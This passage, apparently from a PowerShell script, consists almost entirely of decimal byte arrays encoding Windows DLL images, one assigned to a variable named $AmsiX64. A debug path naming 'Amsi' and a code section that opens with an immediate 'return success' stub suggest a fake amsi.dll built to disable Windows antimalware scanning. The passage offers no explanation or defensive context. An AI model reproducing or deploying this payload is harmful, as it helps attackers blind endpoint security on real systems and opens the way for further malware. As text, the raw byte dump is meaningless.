0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n    $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 